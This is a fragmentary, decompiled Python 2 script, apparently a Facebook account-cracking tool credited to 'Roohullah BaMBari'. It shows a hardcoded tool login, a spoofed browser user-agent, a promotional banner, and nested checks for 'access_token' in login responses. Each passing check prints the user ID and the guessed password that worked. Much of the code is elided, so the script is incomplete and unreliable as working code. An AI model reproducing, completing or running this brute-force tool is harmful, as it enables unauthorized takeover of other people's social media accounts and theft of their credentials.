...
# Facebook : https://www.facebook.com/Roohullah.112233

# uncompyle6 version 

# Original written By Roohullah BaMBari

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'Roohullah BaMBari 

__copyright = 'All rights reserved . Copyright  Abdul Mateen'

CorrectUsername = 'Roohullah'

CorrectPassword = 'Bambarii'
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        os.system('xdg-open https://www.facebook.com/Roohullah.112233')
...
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.63')]
...
/Sir Da Pasa Sir Na Manii Da BaMBari Group <::::::::::::::::[]

 ______________________________________________

 Author   :            Roohullah BaMBari 

 Facebook :          Roohullah Khan 
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  BaMBariOk' + k + c + user + '  |  ' + pass3
